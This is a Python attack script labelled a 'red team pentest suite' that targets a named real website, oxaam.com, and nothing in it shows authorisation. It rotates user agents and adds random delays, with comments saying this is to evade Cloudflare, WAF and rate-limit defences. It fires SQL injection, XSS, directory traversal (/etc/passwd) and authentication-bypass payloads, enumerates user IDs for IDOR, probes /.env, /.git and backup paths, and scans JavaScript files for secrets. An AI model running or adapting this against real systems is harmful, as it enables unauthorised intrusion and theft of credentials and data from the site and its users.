#!/usr/bin/env python3
"""
RED TEAM PENTEST SUITE - oxaam.com
Full security audit with multiple attack vectors
"""

import requests
import sys
import time
import random
import re
from urllib.parse import urljoin, urlparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

# TARGET CONFIGURATION
BASE_URL = "https://www.oxaam.com"
TARGET = BASE_URL

# USER AGENTS FOR ROTATION (Cloudflare evasion)
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0'
]

# SESSION FOR PERSISTENCE
session = requests.Session()
session.verify = True

# RESULTS STORAGE
vulnerabilities = []
discovered_endpoints = []
info_disclosed = []

def log(message, level="INFO"):
    """Colored logging"""
    colors = {
        "INFO": "\033[92m",    # Green
        "WARN": "\033[93m",    # Yellow
        "ERROR": "\033[91m",   # Red
        "SUCCESS": "\033[94m", # Blue
        "RESET": "\033[0m"
    }
    print(f"{colors.get(level, '')}[{level}]{colors['RESET']} {message}")

def get_random_headers():
    """Generate randomized headers to evade WAF"""
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en;q=0.9']),
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Cache-Control': 'max-age=0'
    }

def make_request(url, method='GET', data=None, headers=None, timeout=15, allow_redirects=True):
    """Make HTTP request with evasion techniques"""
    if headers is None:
        headers = get_random_headers()
    
    # Random delay to avoid rate limiting
    time.sleep(random.uniform(0.8, 2.5))
    
    try:
        if method.upper() == 'GET':
            response = session.get(url, headers=headers, timeout=timeout, allow_redirects=allow_redirects)
        elif method.upper() == 'POST':
            response = session.post(url, headers=headers, data=data, json=None, timeout=timeout, allow_redirects=allow_redirects)
        elif method.upper() == 'PUT':
            response = session.put(url, headers=headers, data=data, timeout=timeout, allow_redirects=allow_redirects)
        elif method.upper() == 'DELETE':
            response = session.delete(url, headers=headers, timeout=timeout, allow_redirects=allow_redirects)
        else:
            response = session.request(method, url, headers=headers, data=data, timeout=timeout, allow_redirects=allow_redirects)
        
        return response
    except requests.exceptions.Timeout:
        log(f"Timeout for {url}", "ERROR")
        return None
    except requests.exceptions.RequestException as e:
        log(f"Request failed for {url}: {e}", "ERROR")
        return None

def test_sql_injection():
    """Test for SQL Injection vulnerabilities"""
    log("=" * 60, "INFO")
    log("TESTING: SQL Injection", "WARN")
    log("=" * 60, "INFO")
    
    # SQL Injection payloads
    sql_payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "admin'--",
        "admin'/*",
        "' UNION SELECT NULL--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '00:00:05'--",
        "1' OR '1'='1'--",
        "1' UNION SELECT 1,2,3--"
    ]
    
    # Common endpoints to test
    test_endpoints = [
        "/login",
        "/signin",
        "/auth",
        "/api/login",
        "/api/auth",
        "/search",
        "/api/search",
        "/user",
        "/api/user",
        "/profile",
        "/api/profile"
    ]
    
    vulnerable = False
    
    for endpoint in test_endpoints:
        full_url = urljoin(BASE_URL, endpoint)
        
        # Test GET parameters
        for payload in sql_payloads[:6]:  # Test first 6 to avoid too many requests
            test_url = f"{full_url}?id={quote(payload)}"
            test_url2 = f"{full_url}?username={quote(payload)}"
            test_url3 = f"{full_url}?search={quote(payload)}"
            
            for test_url_final in [test_url, test_url2, test_url3]:
                response = make_request(test_url_final)
                if response and response.status_code == 200:
                    # Check for SQL error patterns
                    error_patterns = [
                        r"SQL syntax.*MySQL",
                        r"Warning.*mysql_",
                        r"PostgreSQL.*ERROR",
                        r"Warning.*pg_",
                        r"Microsoft.*ODBC.*SQL Server",
                        r"SQLite.*error",
                        r"ORA-\d{5}",
                        r"quoted string not properly terminated"
                    ]
                    
                    for pattern in error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            log(f"POTENTIAL SQL INJECTION: {test_url_final}", "SUCCESS")
                            log(f"Error pattern matched: {pattern}", "SUCCESS")
                            vulnerabilities.append({
                                "type": "SQL Injection",
                                "url": test_url_final,
                                "payload": payload,
                                "evidence": "SQL error in response"
                            })
                            vulnerable = True
                            break
        
        # Test POST data
        if endpoint in ["/login", "/signin", "/auth", "/api/login", "/api/auth"]:
            for payload in sql_payloads[:4]:
                post_data = {
                    "username": payload,
                    "email": payload,
                    "password": "test123",
                    "user": payload
                }
                response = make_request(full_url, method='POST', data=post_data)
                if response:
                    error_patterns = [
                        r"SQL syntax.*MySQL",
                        r"Warning.*mysql_",
                        r"PostgreSQL.*ERROR"
                    ]
                    for pattern in error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            log(f"POTENTIAL SQL INJECTION (POST): {full_url}", "SUCCESS")
                            vulnerabilities.append({
                                "type": "SQL Injection (POST)",
                                "url": full_url,
                                "payload": payload,
                                "evidence": "SQL error in response"
                            })
                            vulnerable = True
                            break
    
    if not vulnerable:
        log("No SQL Injection vulnerabilities detected", "INFO")
    
    return vulnerable

def test_xss():
    """Test for Cross-Site Scripting vulnerabilities"""
    log("=" * 60, "INFO")
    log("TESTING: Cross-Site Scripting (XSS)", "WARN")
    log("=" * 60, "INFO")
    
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "'\"><script>alert('XSS')</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>"
    ]
    
    test_endpoints = [
        "/search",
        "/api/search",
        "/comment",
        "/api/comment",
        "/profile",
        "/api/profile",
        "/?q=",
        "/?search=",
        "/?query="
    ]
    
    vulnerable = False
    
    for endpoint in test_endpoints:
        for payload in xss_payloads[:5]:  # Test subset
            if endpoint.startswith("/?"):
                test_url = f"{BASE_URL}{endpoint}{quote(payload)}"
            else:
                test_url = f"{urljoin(BASE_URL, endpoint)}?input={quote(payload)}"
            
            response = make_request(test_url)
            if response and response.status_code == 200:
                # Check if payload is reflected in response
                if payload.replace("'", "&#39;").replace('"', "&quot;") in response.text or \
                   payload in response.text or \
                   "<script>" in response.text.lower():
                    log(f"POTENTIAL XSS: {test_url}", "SUCCESS")
                    log(f"Payload reflected in response", "SUCCESS")
                    vulnerabilities.append({
                        "type": "XSS (Reflected)",
                        "url": test_url,
                        "payload": payload,
                        "evidence": "Payload reflected in response"
                    })
                    vulnerable = True
    
    if not vulnerable:
        log("No XSS vulnerabilities detected", "INFO")
    
    return vulnerable

def test_directory_traversal():
    """Test for Directory Traversal vulnerabilities"""
    log("=" * 60, "INFO")
    log("TESTING: Directory Traversal", "WARN")
    log("=" * 60, "INFO")
    
    traversal_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "/etc/passwd",
        "..\\..\\..\\..\\..\\etc\\passwd"
    ]
    
    test_endpoints = [
        "/file",
        "/download",
        "/api/file",
        "/api/download",
        "/?file=",
        "/?path=",
        "/?filename=",
        "/?document="
    ]
    
    vulnerable = False
    
    for endpoint in test_endpoints:
        for payload in traversal_payloads[:4]:
            if endpoint.startswith("/?"):
                test_url = f"{BASE_URL}{endpoint}{quote(payload)}"
            else:
                test_url = f"{urljoin(BASE_URL, endpoint)}?file={quote(payload)}"
            
            response = make_request(test_url)
            if response and response.status_code == 200:
                # Check for common file contents
                if "root:" in response.text or "[boot loader]" in response.text or \
                   "bin/bash" in response.text:
                    log(f"POTENTIAL DIRECTORY TRAVERSAL: {test_url}", "SUCCESS")
                    vulnerabilities.append({
                        "type": "Directory Traversal",
                        "url": test_url,
                        "payload": payload,
                        "evidence": "System file contents in response"
                    })
                    vulnerable = True
    
    if not vulnerable:
        log("No Directory Traversal vulnerabilities detected", "INFO")
    
    return vulnerable

def discover_endpoints():
    """Discover hidden endpoints and API routes"""
    log("=" * 60, "INFO")
    log("TESTING: Endpoint Discovery", "WARN")
    log("=" * 60, "INFO")
    
    common_paths = [
        "/admin",
        "/administrator",
        "/api",
        "/api/v1",
        "/api/v2",
        "/api/users",
        "/api/auth",
        "/api/login",
        "/api/register",
        "/api/profile",
        "/api/search",
        "/backup",
        "/config",
        "/database",
        "/db",
        "/debug",
        "/dev",
        "/docs",
        "/documentation",
        "/login",
        "/logout",
        "/register",
        "/signup",
        "/signin",
        "/signout",
        "/test",
        "/testing",
        "/phpinfo.php",
        "/info.php",
        "/.env",
        "/.git",
        "/.svn",
        "/robots.txt",
        "/sitemap.xml",
        "/.well-known/security.txt"
    ]
    
    found_endpoints = []
    
    for path in common_paths:
        full_url = urljoin(BASE_URL, path)
        response = make_request(full_url, timeout=10)
        
        if response:
            status = response.status_code
            if status != 404:
                log(f"Found: {full_url} [{status}]", "SUCCESS")
                discovered_endpoints.append({
                    "url": full_url,
                    "status": status,
                    "length": len(response.text)
                })
                found_endpoints.append(full_url)
                
                # Check for interesting content
                if "admin" in response.text.lower() and status == 200:
                    log(f"  -> Admin interface detected", "WARN")
                if "api" in response.text.lower() or "json" in response.headers.get("content-type", ""):
                    log(f"  -> API endpoint detected", "WARN")
                if "password" in response.text.lower() or "secret" in response.text.lower():
                    log(f"  -> Potential sensitive information", "WARN")
                    info_disclosed.append(full_url)
    
    if not found_endpoints:
        log("No additional endpoints discovered", "INFO")
    else:
        log(f"Discovered {len(found_endpoints)} endpoints", "SUCCESS")
    
    return found_endpoints

def test_idor():
    """Test for Insecure Direct Object Reference"""
    log("=" * 60, "INFO")
    log("TESTING: IDOR (Insecure Direct Object Reference)", "WARN")
    log("=" * 60, "INFO")
    
    # Test common ID patterns
    test_ids = [1, 2, 100, 999, 1000, 9999]
    
    test_endpoints = [
        "/api/user/",
        "/api/users/",
        "/user/",
        "/users/",
        "/profile/",
        "/api/profile/",
        "/api/order/",
        "/order/",
        "/api/document/",
        "/document/"
    ]
    
    vulnerable = False
    
    for endpoint in test_endpoints:
        for test_id in test_ids:
            test_url = urljoin(BASE_URL, f"{endpoint}{test_id}")
            response = make_request(test_url)
            
            if response and response.status_code == 200:
                # Check if we got user data without authentication
                if "email" in response.text.lower() or "username" in response.text.lower() or \
                   "password" in response.text.lower() or "phone" in response.text.lower():
                    log(f"POTENTIAL IDOR: {test_url}", "SUCCESS")
                    log(f"  -> Sensitive data accessible without auth", "SUCCESS")
                    vulnerabilities.append({
                        "type": "IDOR",
                        "url": test_url,
                        "evidence": "Sensitive data accessible without authentication"
                    })
                    vulnerable = True
                    break
    
    if not vulnerable:
        log("No IDOR vulnerabilities detected", "INFO")
    
    return vulnerable

def test_information_disclosure():
    """Test for information disclosure"""
    log("=" * 60, "INFO")
    log("TESTING: Information Disclosure", "WARN")
    log("=" * 60, "INFO")
    
    # Check response headers
    response = make_request(BASE_URL)
    if response:
        sensitive_headers = ['server', 'x-powered-by', 'x-aspnet-version', 'x-runtime']
        for header in sensitive_headers:
            if header in response.headers:
                value = response.headers[header]
                log(f"Information disclosed in header '{header}': {value}", "WARN")
                info_disclosed.append(f"Header: {header} = {value}")
        
        # Check for comments in HTML
        comments = re.findall(r'<!--(.*?)-->', response.text, re.DOTALL)
        for comment in comments[:10]:  # First 10 comments
            if any(keyword in comment.lower() for keyword in ['password', 'secret', 'key', 'token', 'api', 'admin']):
                log(f"Potentially sensitive comment found: {comment[:100]}", "WARN")
                info_disclosed.append(f"Comment: {comment[:200]}")
        
        # Check for JavaScript files with sensitive info
        js_files = re.findall(r'<script[^>]*src=["\']([^"\']+\.js)["\']', response.text)
        for js_file in js_files[:5]:
            if not js_file.startswith('http'):
                js_url = urljoin(BASE_URL, js_file)
                js_response = make_request(js_url)
                if js_response:
                    sensitive_patterns = ['api_key', 'apikey', 'secret', 'password', 'token', 'auth']
                    for pattern in sensitive_patterns:
                        if pattern in js_response.text.lower():
                            log(f"Potential sensitive data in JS: {js_url}", "WARN")
                            info_disclosed.append(js_url)
                            break
    
    if info_disclosed:
        log(f"Found {len(info_disclosed)} information disclosure issues", "SUCCESS")
    else:
        log("No obvious information disclosure detected", "INFO")
    
    return len(info_disclosed) > 0

def test_authentication_bypass():
    """Test for authentication bypass vulnerabilities"""
    log("=" * 60, "INFO")
    log("TESTING: Authentication Bypass", "WARN")
    log("=" * 60, "INFO")
    
    bypass_payloads = [
        {"username": "admin", "password": "admin"},
        {"username": "admin", "password": ""},
        {"username": "admin", "password": "' OR '1'='1"},
        {"username": "' OR 1=1--", "password": "anything"},
        {"username": "admin'--", "password": ""},
        {"email": "admin@oxaam.com", "password": "admin"},
        {"user": "admin", "pass": "admin"}
    ]
    
    login_endpoints = [
        "/login",
        "/signin",
        "/auth",
        "/api/login",
        "/api/auth",
        "/authenticate"
    ]
    
    vulnerable = False
    
    for endpoint in login_endpoints:
        full_url = urljoin(BASE_URL, endpoint)
        
        for payload in bypass_payloads:
            response = make_request(full_url, method='POST', data=payload)
            if response:
                # Check for successful login indicators
                if response.status_code in [200, 302, 301]:
                    success_indicators = [
                        "dashboard", "welcome", "logout", "profile", "settings",
                        "session", "token", "redirect", "success"
                    ]
                    location = response.headers.get('Location', '')
                    response_lower = response.text.lower()
                    
                    for indicator in success_indicators:
                        if indicator in response_lower or indicator in location.lower():
                            log(f"POTENTIAL AUTH BYPASS: {full_url}", "SUCCESS")
                            log(f"  -> Payload: {payload}", "SUCCESS")
                            vulnerabilities.append({
                                "type": "Authentication Bypass",
                                "url": full_url,
                                "payload": payload,
                                "evidence": "Successful login with bypass payload"
                            })
                            vulnerable = True
                            break
                    if vulnerable:
                        break
    
    if not vulnerable:
        log("No authentication bypass detected", "INFO")
    
    return vulnerable

def test_rate_limiting():
    """Test for rate limiting and brute force protection"""
    log("=" * 60, "INFO")
    log("TESTING: Rate Limiting / Brute Force Protection", "WARN")
    log("=" * 60, "INFO")
    
    login_endpoints = ["/login", "/api/login", "/auth", "/api/auth"]
    
    for endpoint in login_endpoints:
        full_url = urljoin(BASE_URL, endpoint)
        
        # Send rapid requests
        blocked = False
        for i in range(10):
            response = make_request(full_url, method='POST', 
                                   data={"username": f"test{i}", "password": "test"})
            if response:
                if response.status_code == 429:
                    log(f"Rate limiting detected at {full_url}", "SUCCESS")
                    blocked = True
                    break
                elif "rate limit" in response.text.lower() or "too many" in response.text.lower():
                    log(f"Rate limiting detected at {full_url}", "SUCCESS")
                    blocked = True
                    break
        
        if not blocked:
            log(f"NO RATE LIMITING at {full_url} - Vulnerable to brute force", "WARN")
            vulnerabilities.append({
                "type": "Missing Rate Limiting",
                "url": full_url,
                "evidence": "No rate limiting detected after 10 rapid requests"
            })
    
    return True

def generate_report():
    """Generate final pentest report"""
    log("=" * 60, "INFO")
    log("PENTEST REPORT", "SUCCESS")
    log("=" * 60, "INFO")
    
    log(f"Target: {TARGET}", "INFO")
    log(f"Total Vulnerabilities Found: {len(vulnerabilities)}", "INFO")
    log(f"Endpoints Discovered: {len(discovered_endpoints)}", "INFO")
    log(f"Information Disclosure Issues: {len(info_disclosed)}", "INFO")
    
    if vulnerabilities:
        log("\nVULNERABILITIES:", "WARN")
        for i, vuln in enumerate(vulnerabilities, 1):
            log(f"\n{i}. {vuln['type']}", "SUCCESS")
            log(f"   URL: {vuln.get('url', 'N/A')}", "INFO")
            if 'payload' in vuln:
                log(f"   Payload: {vuln['payload']}", "INFO")
            log(f"   Evidence: {vuln.get('evidence', 'N/A')}", "INFO")
    
    if discovered_endpoints:
        log("\nDISCOVERED ENDPOINTS:", "WARN")
        for endpoint in discovered_endpoints[:10]:  # Show first 10
            log(f"  {endpoint['url']} [{endpoint['status']}]", "INFO")
    
    if info_disclosed:
        log("\nINFORMATION DISCLOSURE:", "WARN")
        for info in info_disclosed[:10]:  # Show first 10
            log(f"  {info}", "INFO")
    
    log("\n" + "=" * 60, "INFO")
    log("PENTEST COMPLETE", "SUCCESS")
    log("=" * 60, "INFO")

def main():
    """Main pentest execution"""
    log("=" * 60, "INFO")
    log("RED TEAM PENTEST - oxaam.com", "SUCCESS")
    log("=" * 60, "INFO")
    log(f"Target: {TARGET}", "INFO")
    log(f"Starting comprehensive security audit...", "INFO")
    log("", "INFO")
    
    try:
        # Initial reconnaissance
        log("Phase 1: Reconnaissance", "WARN")
        response = make_request(BASE_URL)
        if response:
            log(f"Status: {response.status_code}", "INFO")
            log(f"Server: {response.headers.get('server', 'Unknown')}", "INFO")
            log(f"Powered By: {response.headers.get('x-powered-by', 'Unknown')}", "INFO")
            log(f"Response Size: {len(response.text)} bytes", "INFO")
        
        # Run all tests
        log("\nPhase 2: Vulnerability Testing", "WARN")
        discover_endpoints()
        test_information_disclosure()
        test_sql_injection()
        test_xss()
        test_directory_traversal()
        test_idor()
        test_authentication_bypass()
        test_rate_limiting()
        
        # Generate report
        log("\nPhase 3: Report Generation", "WARN")
        generate_report()
        
    except KeyboardInterrupt:
        log("\nPentest interrupted by user", "ERROR")
        generate_report()
    except Exception as e:
        log(f"Unexpected error: {e}", "ERROR")
        import traceback
        traceback.print_exc()
        generate_report()

if __name__ == "__main__":
    main()
